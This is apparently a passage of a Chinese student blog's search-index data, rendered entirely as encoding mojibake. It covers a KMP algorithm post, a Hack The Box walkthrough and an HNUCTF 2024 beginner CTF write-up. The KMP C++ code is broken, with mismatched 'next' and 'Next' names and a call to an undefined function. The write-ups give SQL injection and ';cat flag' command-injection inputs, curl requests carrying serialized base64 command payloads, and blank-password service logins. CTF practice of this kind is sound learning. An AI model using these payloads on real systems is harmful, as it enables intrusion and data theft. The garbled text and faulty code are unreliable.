å­—ç¬¦ä¸²åŒ¹é…ç®—æ³•æ›´é«˜æ•ˆçš„å…³é”®åŸå› ã€‚\n\n### ä¸ºä»€ä¹ˆè¦è¿”å› i-j+1 çš„ä½ç½®\nå…³äºä¸ºä»€ä¹ˆè¿”å›çš„æ˜¯ `i-j+1` è€Œä¸æ˜¯ `i` çš„ä½ç½®ï¼Œè¿™æ˜¯å› ä¸ºåœ¨KMPç®—æ³•ä¸­ï¼Œå½“æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªå®Œå…¨åŒ¹é…æ—¶ï¼š\n1. `i` æŒ‡å‘çš„æ˜¯**ä¸»ä¸²ä¸­**åˆšåˆšåŒ¹é…å®Œæˆçš„**æœ€åä¸€ä¸ªå­—ç¬¦çš„ä½ç½®**ï¼ˆå½“å‰å¾ªç¯ç»“æŸåï¼‰ã€‚\n2. `j` ç­‰äºæ¨¡å¼ä¸²çš„é•¿åº¦ `sz2`ï¼Œè¡¨ç¤ºæ¨¡å¼ä¸²å·²ç»å®Œå…¨åŒ¹é…ï¼Œæ‰€ä»¥è¿™é‡ŒæŠŠ`j` å†™ä½œsz2æ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚\n3. æˆ‘ä»¬éœ€è¦è¿”å›çš„æ˜¯**åŒ¹é…å¼€å§‹çš„ä½ç½®**ï¼Œè€Œä¸æ˜¯ç»“æŸçš„ä½ç½®ã€‚\n\nè®¡ç®—åŒ¹é…å¼€å§‹ä½ç½®çš„å…¬å¼æ˜¯ï¼š\n```\nåŒ¹é…èµ·å§‹ä½ç½® = å½“å‰ä½ç½®(i) - æ¨¡å¼ä¸²é•¿åº¦(j) + 1\n```\n\nå…·ä½“åˆ†æï¼š\n- å‡è®¾ä¸»ä¸²æ˜¯ \"ABCDEF\"ï¼Œæ¨¡å¼ä¸²æ˜¯ \"CDE\"\n- å½“åŒ¹é…å®Œæˆæ—¶ï¼Œ`i` æŒ‡å‘ 'E'ï¼ˆç´¢å¼•4ï¼‰ï¼Œ`j` ç­‰äº3\n- åŒ¹é…çš„èµ·å§‹ä½ç½®åº”è¯¥æ˜¯ 'C'ï¼ˆç´¢å¼•2ï¼‰\n- ç´¢å¼•è®¡ç®—ï¼š4 - 3 + 1 = 2 \n\nåœ¨è¿™é‡Œçš„forå¾ªç¯å®ç°ä¸­ï¼Œå› ä¸ºå¾ªç¯ç»“æŸå `i` ä¼šè‡ªå¢ï¼Œæ‰€ä»¥ `i` å®é™…ä¸ŠæŒ‡å‘çš„æ˜¯åŒ¹é…å®Œæˆåçš„ä¸‹ä¸€ä¸ªå­—ç¬¦ä½ç½®ï¼Œä¸ºäº†é¿å…è¿™ç§é”™è¯¯è¿ç®—ï¼Œæˆ‘ä»¬åœ¨æ¯æ¬¡é”™è¯¯åŒ¹é…å›æº¯çš„æ—¶å€™ï¼Œéƒ½åšä¸€æ¬¡ **i--**ï¼Œè®© `i` å›åˆ°åŒ¹é…å®Œæˆçš„æœ€åä¸€ä¸ªä½ç½®ã€‚å› æ­¤ï¼Œæ­£ç¡®çš„è®¡ç®—æ˜¯ `i-j+1`ã€‚\n## æ€»ä½“å®ç°ä»£ç ï¼š\n```cpp\nvector<int>getnext(string s){\nÂ  Â  int n=s.size();\nÂ  Â  int j=0;//å‰ç¼€\nÂ  Â  vector<int>next(n,0);\nÂ  Â  for(int i=1;i<n;i++){//åç¼€\nÂ  Â  Â  Â  while(j>0&&s[i]!=s[j]) j=next[j-1];\nÂ  Â  Â  Â  if(s[j]==s[i]) j++;\nÂ  Â  Â  Â  next[i]=j;\nÂ  Â  }\nÂ  Â  return next;\n}\nvector<int>KMP(string s,string p){\nÂ  Â  int sz1=s.size(),sz2=p.size();\nÂ  Â  vector<int>next=getnext(p);\nÂ  Â  vector<int>v;\nÂ  Â  for(int i=0,j=0;i<sz1;i++){\nÂ  Â  Â  Â  if(s[i]==p[j]){\nÂ  Â  Â  Â  Â  Â  j++;\nÂ  Â  Â  Â  }\nÂ  Â  Â  Â   else if(j>0){\nÂ  Â  Â  Â  Â  Â  j=Next[j-1];\nÂ  Â  Â  Â  Â  Â  i--;\nÂ  Â  Â  Â  }\nÂ  Â  Â  Â  if(j==sz2){\nÂ  Â  Â  Â  Â  Â  v.push_back(i-j+1);\nÂ  Â  Â  Â  Â  Â  j=Next[j-1];\nÂ  Â  Â  Â  }\nÂ  Â  }\nÂ  Â  return v; Â  Â \n}\n\n  \n\nint main(){\nÂ  Â  string s,p;\nÂ  Â  cin>>s>>p;\nÂ  Â  vector<int>ans=KMP(s,p);\nÂ  Â  for(int i=0;i<ans.size();i++){\nÂ  Â  Â  Â  cout<<ans[i]+1<<endl;\nÂ  Â  }\nÂ  Â  vector<int>Next=next(p);\nÂ  Â  for(int i=0;i<Next.size();i++){\nÂ  Â  Â  Â  cout<<Next[i]<<\" \";\nÂ  Â  }\nÂ  Â  return 0;\n}\n\n```\n\né¢˜ç›®ï¼š[æ´›è°·KMPæ¨¡æ¿é¢˜](https://www.luogu.com.cn/problem/P3375)\n\n","tags":["å­¦ä¹ ","æ•°æ®ç»“æ„","ç¼–ç¨‹"],"categories":["æ—¥å¸¸å­¦ä¹ ","æ•°æ®ç»“æ„"]},{"title":"é«˜æ•°","url":"/2025/03/16/xue-xi/shu-xue/gao-shu-duo-yuan-wei-fen/","content":"# é«˜æ•°\n## è¿ç»­ï¼Œå¯åå¯¼ï¼Œå¯å¾®è¯æ˜\næ„Ÿè°¢è±å®ã€‚\n![](/images/é«˜æ•°-å¤šå…ƒå¾®åˆ†/IMG_20250314_112120.jpg)\n\n\n\n\n\n\n\n\n","tags":["å­¦ä¹ ","æ•°å­¦"],"categories":["æ—¥å¸¸å­¦ä¹ ","é«˜ç­‰æ•°å­¦"]},{"title":"æŠ±æ€¨","url":"/2025/03/13/sheng-huo/ji-lu/bao-yuan/","content":"# æŠ±æ€¨\n## ä¸æ˜“ğŸ˜­\nä¸ºä»€ä¹ˆ Obsidian æ²¡æœ‰**è‡ªåŠ¨å­˜æ”¾é™„ä»¶åˆ°æŒ‡å®šä½ç½®+è‡ªåŠ¨æŠŠç²˜è´´å›¾ç‰‡æ”¹æˆ markdown è¯­æ³•+æ”¯æŒæ’å…¥æ ¼å¼ä¿®æ”¹**çš„ä¸‰åˆä¸€æ’ä»¶ï¼Ÿï¼Ÿï¼Ÿ\nç¬¬ä¸€ä¸ªæœ‰ Custom Attachment Location\nç¬¬äºŒä¸ª Obsidian è‡ªå¸¦\nç¬¬ä¸‰ä¸ªè°æ¥æ•‘æ•‘æˆ‘ï¼Ÿï¼ŸğŸ¥¹\næ¯æ¬¡ paste å›¾ç‰‡çš„æ—¶å€™ï¼Œ**éš¾é“æˆ‘ä¸€å®šè¦å»æ‰‹åŠ¨ä¿®æ”¹æˆ‘çš„ç²˜è´´æ ¼å¼ï¼Œå¥½è®©æˆ‘çš„ hexo è¯†åˆ«åˆ°å—ï¼Ÿ**\næˆ‘è¶…çº§æ‡’çš„....ä¸æƒ³æŠ˜è…¾å¤ªå¤šäº†ğŸ˜«\n\n\n---\n## å¹é£æœº\nå¹å¤´å‘çš„æ—¶å€™å¹é£æœºå–·ç«äº†ï¼Œæˆäº†æ‰“ç«æœºã€‚ğŸ˜­\næˆ‘å‰å‡ å‘¨æŠŠä»¥å‰çš„å¹é£æœºæ‰”äº†ï¼Œæ¢äº†è¿™ä¸ªåŠŸç‡å¤§çš„â€¦ğŸ˜ğŸ¤¨ğŸ˜©\nä¸€ä¸¾ä¸¤å¾—ï¼Œæµªè´¹æ—¶é—´åˆæµªè´¹é’±ï¼Œè°¢è°¢æ•™è®­ã€‚\n*å…¶å®ç³Šå‘³è¿˜æŒºé¦™çš„ã€‚å‘ƒâ€¦å†ä¹Ÿä¸åšä¸åƒæ™šé¥­çš„äº‹æƒ…äº†*\n\n****\n\n# Typecho\nè¢«è¿‡æ—¶æ•™ç¨‹æŠ˜ç£¨åˆ°æ²¡è„¾æ°”â€¦\naiåªé€‚åˆç”¨äºåŸåŸºç¡€ä¿®æ”¹ï¼Œä¸é€‚åˆæä¾›æ•™ç¨‹ã€‚ğŸ‘¿\nåœ¨ä¸åŒåšå®¢ç½‘ç«™ç©¿æ¢­ç»ˆäºæ­å»ºèµ·è‡ªå·±çš„[Typechoåšå®¢ç½‘ç«™](blog.moyuin.top)ï¼Œå¼€å¿ƒï¼Œä½†æ˜¯æŠ˜è…¾å¥½ç´¯ï¼Œéš¾è¿‡ğŸ˜¡ã€‚\n\n","tags":["è®°å½•"],"categories":["æ‚è°ˆ"]},{"title":"Hack the box","url":"/2025/03/11/xue-xi/ctf/hack-the-box/","content":"# Hack the box\nç©ä¸€ä¸‹ã€‚\n## èµ·æ­¥\nèµ·æ­¥çš„ç¡®å¾ˆç®€å•ï¼Œè¿æ¥äº†vpnç„¶åå°±å¯ä»¥ç”¨kaliç©ç©æ¸—é€æµ‹è¯•äº†ã€‚\n```bash\nsudo openvpn Moyuin.vpn #è®°ä½å¾—åœ¨æ–‡ä»¶ç›®å½•é‡Œé¢æ‰“å¼€ï¼Œå¦åˆ™å°±æ˜¯æŠ¥é”™\n```\n\n### telnet\n\n**åŸºç¡€æµç¨‹**ï¼š\n```bash\nping {target_ip} # çœ‹çœ‹pingæ˜¯å¦é€šï¼Œç¡®è®¤ä¸€ä¸‹ç½‘ç»œ\n\nsudo nmap -sV -p {target_ip} # æ‰¾å¼€çš„ç«¯å£ï¼Œç¡®è®¤ä¸€ä¸‹æˆ‘ä»¬çš„æ–¹æ¡ˆ\n\ntelnet {target_ip} #ç›´æ¥è¿æ¥ï¼Œç”¨rootç™»é™†\n\nls\nflag.txt  snap\n\ncat flag.txt\nb40abdfe23665f766f9c61ecba8a4c19\n```\næäº¤ç¬¬ä¸€ä¸ª flagï¼telnetå¼±å‡­è¯ï¼\n\n### ftp (File Transfer Protocol)\n```bash\nping {target_ip}\n\nsudo nmap -sV {target_ip}\n# å¼€21ç«¯å£ï¼Œç”¨ftpè¿æ¥\n\nftp -a {target_ip} #ä½¿ç”¨anonymousåŒ¿åç™»é™†\n\nls | dir\n\nget flag.txt | mget flag.txt #åè€…ä¸‹è½½å¤šä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ç”¨lcdå…ˆè®¾ç½®å¥½ç›®å½•\n\nctrl+z #é€€å‡º\n\ncat flag.txt\n```\n\n### SMB (Server Message Book)\n`sudo nmap -sV {target_ip}` æ‰«åˆ°ç«¯å£ã€‚\n![](/images/Hackthebox/20250317000824135.png)\nSMB åœ¨445/tcpè¿è¡Œï¼ŒæœåŠ¡åä¸º microsoft-dsã€‚\nä½¿ç”¨ `smbclient -L {target_ip}` è®¿é—®SMPæœåŠ¡ï¼Œè·å–æ‰€æœ‰çš„ Dancing Listï¼Œä½†ç™»é™†åæç¤ºéœ€è¦è´¦æˆ·ï¼Œéšä¾¿è¾“å…¥åå¾—åˆ°å¯ä»¥ç™»é™†çš„è´¦æˆ·ã€‚\n\n![](/images/Hackthebox/20250317001452215.png)\næœ‰4ä¸ªç”¨æˆ·ï¼Œä¸€ç›´è®¿é—®ï¼Œç›´åˆ°è·å–æƒé™ã€‚\nä½¿ç”¨  `smbclient \\\\\\\\{target_ip}\\\\{ç”¨æˆ·å}` ï¼Œç”¨äºç™»é™†ï¼Œå¯æ˜¯å¯†ç æ€ä¹ˆåŠå‘¢ï¼Ÿä½¿ç”¨ç©ºå¯†ç ï¼Œä¸€ä¸ªä¸€ä¸ªè´¦æˆ·è¯•ä¸€è¯•ã€‚\nç”¨æˆ·åä¸ºWorkSharesæ—¶ï¼ŒæˆåŠŸã€‚\n![](/images/Hackthebox/20250317002508240.png)\n\nç”¨helpçœ‹çœ‹æŒ‡ä»¤ã€‚å‘ç°åŸºæœ¬å’ŒlinuxæŒ‡ä»¤ç›¸åŒã€‚\n![](/images/Hackthebox/20250317002646839.png)\nç”¨cdè¿›å…¥å„ç§åº“ï¼Œçœ‹çœ‹flagè—åœ¨å“ªé‡Œã€‚ç”¨ `get {æ–‡ä»¶å}` å¾—åˆ°æ–‡ä»¶ã€‚\nçœ‹å®Œåº“äº†å°± `cd .. ` é€€å‡ºã€‚\n![](/images/Hackthebox/20250317002934559.png)\næ‰¾åˆ°flagï¼Œgetåexitã€‚\næœ€å `cat flag.txt` å¾—åˆ°ç­”æ¡ˆã€‚\n![](/images/Hackthebox/20250317003131774.png)\n\n### TCP(Redis)\nå…ˆæ‰«ç«¯å£ï¼Œè‡ªå·±çš„è™šæ‹Ÿæœºä¸çŸ¥é“ä¸ºä»€ä¹ˆnmapæ‰«ä¸å‡º6379è¿™ä¸ªç«¯å£ï¼Œåªå¥½ä¸€ä¸ªä¸€ä¸ªè¯•äº†\n![](/images/Hackthebox/20250318225134933.png)\nRedisæ˜¯ä¸€ä¸ªå†…å­˜æ•°æ®åº“ï¼Œè¯¦è§[Redisç»´åŸºç™¾ç§‘](https://en.wikipedia.org/wiki/Redis)ã€‚\nä½¿ç”¨ `redis-cli` è¿›å…¥å®¢æˆ·ç«¯åŸºæœ¬æ“ä½œã€‚[å¯çœ‹èœé¸Ÿæ•™ç¨‹ã€‚](https://www.runoob.com/redis/redis-commands.html)\nç”¨ -h æŒ‡å®šä¸»æœºåï¼Œ-p æŒ‡å®šç«¯å£ï¼Œ -a æŒ‡å®šå¯†ç ã€‚\n```bash\nredis-cli -h {target_ip} -p 6379 -a \"\"\n```\nè¿æ¥è¿œç¨‹redisæœåŠ¡å™¨ï¼Œå¼€å§‹æ“ä½œã€‚\nä½¿ç”¨\n```bash\n{target_ip:6379}> INFO\n```\næ‰¾åˆ°æœåŠ¡å™¨çš„æ¶ˆæ¯ã€‚\n![](/images/Hackthebox/20250318231434680.png)\nåœ¨çœ‹keyspaceçš„æ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°è¿æ¥çš„æ˜¯å“ªä¸€ä¸ªæ•°æ®åº“ï¼š\n![](/images/Hackthebox/20250318232344057.png)\nè¿™é‡Œæ˜¾ç¤ºï¼šè¿™ä¸ªæœåŠ¡å™¨ä¸Šåªæœ‰ä¸€ä¸ªæ•°æ®åº“db0ï¼Œdb0æœ‰4ä¸ªkeyï¼Œå¹¶ä¸”æ²¡æœ‰è¿‡æœŸæ—¶é—´ï¼Œæ¯ä¸ªæ•°æ®åº“çš„æ•°æ®æ˜¯éš”ç¦»çš„ï¼Œä¸€èˆ¬ç”¨ä¸€ä¸ªæ•°æ®åº“çš„keyå­˜ä¸åŒæ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆ\n```bash\nkeys * #æŸ¥çœ‹è¿™ä¸ªæ•°æ®åº“æ‰€æœ‰çš„keysçš„åç§°ï¼Œç›¸å½“äºlsäº†\n```\nps:å¦‚æœæœ‰ä¸åŒæ•°æ®åº“ï¼Œæˆ‘ä»¬éœ€è¦å…ˆ\n```bash\nselect [index]\n```\nç”¨äºé€‰æ‹©ä¸åŒçš„æ•°æ®åº“ã€‚\n![](/images/Hackthebox/20250318232918261.png)\næ‰¾åˆ°äº†flagï¼Œæˆ‘ä»¬ç›´æ¥\n```bash\nget flag\n```\n![](/images/Hackthebox/20250318232955821.png)\nå¾—åˆ°flagã€‚\n\n## å…è´¹HTBå…³å¡ç»“æŸ,ä¹‹åç©ä¸€ç©åˆ«çš„ã€‚","tags":["CTF"],"categories":["CTFå­¦ä¹ "]},{"title":"HNUCTF2024æ–°ç”Ÿæ¯writeup","url":"/2025/03/05/xue-xi/ctf/hnuctf2024-xin-sheng-bei-writeup/","content":"# HNUCTF2024æ–°ç”Ÿæ¯writeup\n\n**HNUCTF**æ–°ç”Ÿæ¯â€”â€”æ¥è‡ªä¸ç¡è§‰çš„æ–°ç”Ÿ**MOMOsleeping**çš„wirteup\nè¿™æ˜¯ä¸€ç¯‡ç•™æ¡£ï¼Œä¸ºHNU2024å¹´12æœˆçš„ä¸€åœºæ–°ç”Ÿæ¯writeupã€‚\nä¹Ÿæ˜¯æˆ‘çš„ç¬¬ä¸€åœºCTFã€‚\n\n## åŸºæœ¬ä¿¡æ¯\n\n>**å¹³å°idï¼šMoyuin**\n>**æ’åï¼šç¬¬8å**\n\n## **è§£é¢˜æƒ…å†µ**\n\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/è§£é¢˜æƒ…å†µ.png)\n\n### Misc\n#### 1.Misc **ç­¾åˆ°**\n\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/misc1.png)\nå¤åˆ¶ç²˜è´´å³å¯ã€‚\n>**HNUCTF{Welcome_to_HNUCTF2024!}**\n\n#### 2.Misc **ç½‘ç»œé²¨é±¼**\nä¸Šç½‘æœç´¢åå‘ç°æ˜¯ä¸€ä¸ªç½‘ç»œå—…æ¢åŒ…ï¼Œä½¿ç”¨**Wireshark**æ‰“å¼€æ–‡ä»¶ï¼Œåœ¨ä¸€å †files not foundä¸­å‘ç°è¿™ä¸ªhttpæµé‡getçš„æœ‰ç‚¹ç‰¹åˆ«ã€‚\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/misc2.png)\nçŒœæµ‹æ˜¯base64åŠ å¯†ï¼Œè§£ç åå¾—åˆ°ã€‚\n>**HNUCTF{w1r3sh4rk_4n4lys1s}**  \n\n#### 3.Misc **bob_traffic**\nåŒæ ·æ˜¯ç½‘ç»œå—…æ¢åŒ…ã€‚\nåˆ©ç”¨wiresharkç›´æ¥å»åˆ†ætcpå’Œhttpçš„getï¼Œå‘ç°æœ‰ä¸€ä¸ªç‰¹æ®Šæµé‡ï¼ˆå”¯ä¸€çš„ï¼Œæ˜¾ç¤ºfï¼agï¼Œæ‰“å¼€çœ‹çœ‹å‘ç°ï¼‰\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/misc3.png)\nå¾—åˆ°flagã€‚\nä¸ä¸Šä¸€é¢˜è§£é¢˜æ€è·¯é‡å¤äº†ï¼Œä¹Ÿè®¸ä¸Šä¸€é¢˜çš„å„å¤§httpæµé‡é‡Œé¢è—æœ‰æ‰€ç„æœºï¼Ÿ\n>**HNUCTF{pcapng_Zcpuatre_traffic}**\n\n#### 4.Misc **æ–°ä½›ç»**\n\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/misc4.png)\næ‰“å¼€txtæ˜¯ä¸€ä¸ªhexç¼–ç ï¼Œä½¿ç”¨cyberchefè§£å¯†å¾—åˆ°\n```\nTFJZR1hKe2E2blIzaWdfcTBWM19JcmcwZ01yOX0=\n```\n\næ‹–è¿‡å»base64è§£å¯†ï¼Œå¾—åˆ°\n\n```\nLRYGXJ{a6nR3ig_q0V3_Irg0gMr9}\n```\n\nä»€ä¹ˆç©æ„å„¿ï¼Ÿ\nè¿·èŒ«ä¸­çœ‹åˆ°é¢˜ç›®è¯´ï¼š\n\n>å¬é—»å‡¯æ’’è´æ–¯ã€‚çŸ¥æ™“16ä¸stringçš„è½®å›ã€‚\n\nè´æ–¯æ˜¯æŒ‡base64ï¼Œé‚£ä¹ˆå‡¯æ’’å°±æ˜¯....\nå‡¯æ’’å¯†ç ï¼Ÿå°è¯•å‡¯æ’’å¯†ç ä¸€æ­¥ä¸€æ­¥è§£å†³ã€‚\néå†4ä¸ªåŠ å¯†ä½ç§»åå¾—åˆ°æƒ³è¦çš„ç»“æœã€‚\n>**HNUCTF{w6jN3ec_m0R3_Enc0cIn9}**\n\n#### 5.Misc **Tetris**\nç»å…¸æœ¬åœ°æ¸¸æˆCEä¿®æ”¹å™¨åˆ·åˆ†å’¯ã€‚\nç”¨ceä¿®æ”¹è¿™ä¸ªæ¸¸æˆï¼Œè·Ÿç€ç½‘ä¸Šæ•™ç¨‹æ¥ã€‚\nå…ˆå¾—å‡ åˆ†ç„¶ånext scanæœ€ç»ˆå¾—åˆ°è¿™ä¸¤ä¸ªaddressã€‚\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/misc5_1.png)\nChangeä¸€ä¸‹å˜æˆ10000ï¼Œå¾—åˆ°é¢˜ç›®è¦æ±‚â€œ10000åˆ†å¾—åˆ°flagâ€ã€‚\næŠŠvalueæ”¹åˆ°10000ä»¥ä¸Šçš„æ•°ï¼Œç„¶åè®©ä¹±ç©è®©gameoverï¼Œä¹‹åå¼¹å‡ºæ¥:\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/misc5_2.png)\nå¾—åˆ°flagã€‚\n>`HNUCTF{#31c0m3_t0_HN#CtF_2024_eX1JT0O1}`\n*è¿™é‡Œä½¿ç”¨éä»£ç å—ä¼šå‡ºæ¸²æŸ“é—®é¢˜....{å’Œ#çš„ç»„åˆå¤ªææ€–*\n\n\n#### 6.Misc **git_leak**\næ‰“å¼€ä¸‹è½½çš„æ–‡ä»¶ï¼Œçœ‹è§flag.txtæ‰“å¼€:\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/misc6-1.png)\né‚£æˆ‘å°±ä¸‹ä¸€ä¸ªTyporaå§ã€‚å­¦é•¿æœ‰å¿ƒäº†ï¼Œç»™æ–°ç”Ÿè¿™æ ·çš„å°å»ºè®®ã€‚\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/misc6-2.png)\nè¯´é‡Œæœ‰ä¸ªflagï¼Œå¼€æ‰¾â€œè¿™é‡Œâ€ï¼Œé¢˜ç›®ä¹Ÿè¯´äº†æ˜¯â€œgit leakâ€ã€‚\nåˆšå¥½ï¼Œæ‰“å¼€.gitç¿»æ‰¾ï¼Œå‘ç°æœ‰ä¸€ä¸ªæ–‡ä»¶å«flagï¼Œè¯´æ˜gité‡Œé¢æœ‰æœ‰å…³flagsçš„è®°å½•ï¼\næ‰“å¼€å¾—åˆ°:\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/misc6-3.png)\nåˆšå¥½vscodeé‡Œé¢æœ‰ä¸€ä¸ªgitæ’ä»¶ï¼Œå°±å¯¼å…¥è¿›å»çœ‹çœ‹è®°å½•å§ã€‚\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/misc6-4.png)Flagåœ¨gité‡Œé¢leakå’¯ã€‚\n> **HNUCTF{y0u_h4ve_f1nd_th3_g1t_l34k}**\n\n### Crypto\n#### 1.Cypto **Buddha**\n**ä½›æ›°è§£å¯†ä¸ºbase64**\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/crypto1-1.png)\nBase64è§£å¯†å³å¯\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/crypto1-2.png)\n>**HNUCTF{buddha_2c5f12b7-a95f-4c22-9372-1e320b297f49}**\n\n#### 2.Crypto **ebg13**\n**Base64**è§£å¯†\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/crypto2-1.png)\nåŠ å‡¯æ’’å¯†ç \n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/crypto2-2.png)\n\n>**HNUCTF{rot_is_fun_e8057890-1e42-4c61-9e57-4ad8c218e4c3}**\n\n#### 3.Crypto **ezrsa**\nè®©aiå†™ä¸€ä¸ªè§£å¯†rsaçš„python ,å†ä¸æ–­è£…åº“ä¹‹åå¾—åˆ°ã€‚\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/crypto3-1.png)\n\n>**HNUCTF{rsa_is_fun_8e4b49fd-070c-473f-a510-ff891b95f56b}**\n\n### WEB  \n#### 1.Web **ez_sqli**\nç»å…¸sqlæ³¨å…¥ã€‚\nç»å…¸çš„ç”¨æˆ·åï¼šadmin' OR '1'='1\nå¯†ç ï¼šè¾“å…¥å•¥éƒ½è¡Œ\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/web1.png)\n\n>**HNUCTF{SQL_iNJECTor_4059a701-61a6-4f11-96bd-e6b01e3a3186}**\n\n\n#### 2.Web **ez_cmdi**\nç°å­¦curlï¼Œç†è§£ä¸€ä¸‹getå’Œpostã€‚\nçœ‹ipï¼Œipåçš„è¾“å…¥å¯ä»¥å½“ä½œå‘½ä»¤ï¼Œç›´æ¥cat flagã€‚\né‚£æˆ‘ä»¬ç»™ipåå‘é€commandå³å¯ã€‚\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/web2.png)\n>**HNUCTF{ping_command_091ae904-c702-4b02-9bf6-9d377aa382c6}**\n\n#### 3.Web **md5:**\nç»å…¸md5= =æ¯”è¾ƒã€‚\næ ¹æ®ifæ¡ä»¶å¯ä»¥åˆ¤æ–­è¦æ‰¾ä¸¤ä¸ªä¸åŒä½†md5ç›¸åŒçš„å­—ç¬¦ä¸²\næ‰¾ä¸ªmd5ç¢°æ’å¯¹ç›¸åŒçš„å¯†ç å’Œç”¨æˆ·åå°±okäº†ï¼Œè¿™ä¸ªå¾—å»ç½‘ä¸Šæ‰¾ä¸€ä¸‹ã€‚\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/web3.png)\néšä¾¿æŒ‘ä¸€ä¸ªcurlä¸€ä¸‹è¾“å…¥postä¼ å‚å³å¯ã€‚\nè¾“å…¥ï¼š\n```\ncurl -X POST -d \"password=QNKCDZO\" \"http://129.204.78.34:20703?name=240610708\"\n```\nå¾—åˆ°Flag:\n>**HNUCTF{easy_md5_2b34686e-50b2-45e8-9757-e28a94fece1f}**\n\n#### 4.Web **md5_again:**\nä»¥ä¸ºæ˜¯Nameä»getå˜æˆpostï¼Œæ”¹ä¸€ä¸‹è¾“å…¥curlå°±è¡Œ\nå‘ç°ä¸å¯¹ï¼\nè½¬å¤´ä¸€çœ‹å‘ç°æ˜¯ä¸¥æ ¼ç›¸ç­‰ã€‚ä¸º===\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/web4.png)\nç”±äºé¢˜ç›®è¿˜é™å®šäº†å¼ºåˆ¶è½¬åŒ–å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨æ•°ç»„æ¥ç»•è¿‡ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€å¯¹md5ç›¸åŒè€Œä¸åŒå­—ç¬¦çš„å­—ç¬¦ä¸²ã€‚æˆ‘ä»¬åªèƒ½ä½¿ç”¨md5ç¢°æ’æ¥å®ç°ã€‚\nå»ç½‘ä¸Šæ‰¾ä¸€ä¸‹ç¬¦åˆè¦æ±‚çš„ï¼Œå¤åˆ¶ç²˜è´´å½¢æˆpostè¦ä¼ çš„å‚æ•°ã€‚\ncurl postè®°å¾—urlencodeï¼ŒæŠŠç‰¹æ®Šå­—ç¬¦ä¼ å‡ºå»ã€‚\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/web4-2.png)\n```\ncurl -X POST \"http://x.x.x.x:xxxx\" \\\n     -H \"Content-Type: application/x-www-form-urlencoded\" \\\n     -d \"name=M%9C9h%FF%E0%E3%5C%20%9...%93%D8&password=M%9C9h%FF%E0%E3%5C%20%9...%93%D8\"\n```\npowershellä¼ å…¥ã€‚\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/web4-3.png)\nå¾—åˆ°flag\n>**HNUCTF{md5_again_bcf8de06-3aa5-4c09-9120-4bfeccf0b5a1}**\n\n#### 5.Web **ez_serialize**\nçœ‹å¾—æ‡‚é‚£ä¸ªç½‘ç«™çš„phpï¼š\nä¼ å…¥postçš„å‚æ•°ä¸ºbase64å¯ä»¥è½¬åŒ–ä¸ºcommandæŒ‡ä»¤ï¼Œé‚£æˆ‘ä»¬ç›´æ¥å…ˆlsçœ‹çœ‹æœ‰æ²¡æœ‰flagï¼Œç„¶åcatä¸€ä¸‹å°±å‡ºæ¥äº†ã€‚\nå…ˆå°†å‘½ä»¤è½¬åŒ–ä¸ºbase64ï¼Œç„¶åcurlä¼ è¿›å»ã€‚\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/web5-1.png)\nè·å–lsï¼š\n```\ncurl -X POST -d\n\"data=Tzo10iJteWNtZCI6MTp7cz0z0iJjbWQ103M6NDoibHMgLyI7fQ==\"\nhttp://129.204.78.34:20738/\n```\ncat flagï¼š\n```\ncurl -X POST -d\n\"data=Tzo10iJtewNtZCI6MTp7cz0z0iJjbwQi03M60ToiY2F0Ic9mbGFnIjt9\" http://129.204.78.34:20738/\n```\n>**HNUCTF{easy_serialize_af79f24b-7638-4e49-b60d-08ac1431d690}**\n\n### PWN\n#### 1.Pwn **command injection**\nncè¿æ¥åˆ°ipï¼Œè¿™ä¸ç”¨è¯´ã€‚\nè·å–commandæƒé™åï¼Œä½†æ˜¯å‘ç°lså’Œcatæ²¡ååº”ã€‚\nä½†æ˜¯çœ‹äº†çœ‹è§„åˆ™åï¼Œæ˜¾ç¤º==;==åçš„å‘½ä»¤ä¼šè¿›è¡Œã€‚\nè¯¶ï¼Œé‚£æ˜¯ä¸æ˜¯è¯´æ˜ ï¼›å‰é¢çš„æŒ‡ä»¤æ— æ³•æ‰§è¡Œï¼Œåé¢çš„æŒ‡ä»¤å¯ä»¥è¿›è¡Œï¼Ÿç„¶åå°±å°è¯• ;cat flagäº†ä¸€ä¸‹ï¼Œç»“æœå°±å‡ºæ¥äº†\n![](/images/HNUCTF2024æ–°ç”Ÿæ¯writeup/PWN1.png)\n> **HNUCTF{u_have_completed_the_command_injection_28918ec949db}**\n\n### Reverse\n#### 1.Reverse: **ez_reverse1**\n\nç­¾åˆ°é¢˜å°±è¦æœ‰ç­¾åˆ°é¢˜çš„æ ·å­ï¼Œåœ¨ç½‘ä¸Šçœ‹çœ‹reverseç­¾åˆ°é¢˜ä¸€èˆ¬ä»€ä¹ˆæ ·ï¼Œç„¶åå­¦ä¹ ã€‚\n**å…ˆä¸‹è½½ç¥å™¨ida pro,å†è·Ÿç€åš**\n- å°†æ–‡ä»¶å¯¼å…¥åˆ°IDAé‡Œ\n- 